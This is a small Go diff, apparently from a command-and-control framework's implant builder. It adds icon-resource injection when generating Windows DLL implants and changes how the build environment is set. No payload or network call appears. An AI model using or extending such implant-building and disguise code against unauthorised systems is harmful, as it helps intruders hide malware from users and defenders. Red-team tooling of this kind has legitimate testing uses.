@@ -86,6 +86,11 @@ func GenerateWindowsDLL(cfg ImplantConfig, outputDir string) (string, error) {
 
 	ldflags, blob, sKey := buildLdflags(cfg, profile, "windows")
 
+	// Windows icon handling (DLL also supports .rsrc)
+	if err := injectIconResource(tmpDir, cfg); err != nil {
+		fmt.Printf("icon injection warning: %v\n", err)
+	}
+
 	outName := cfg.Filename
 	if outName == "" {
 		outName = "forgec2_agent.dll"
@@ -172,7 +177,7 @@ func buildAgentBinaryDLL(goCmd, workDir, ldflags, outPath string, obfuscate bool
 		".",
 	)...)
 	cmd.Dir = workDir
-	cmd.Env = append(os.Environ(),
+	cmd.Env = goModuleEnv(
 		"GOOS="+goos,
 		"GOARCH="+goarch,
 		"CGO_ENABLED=1",
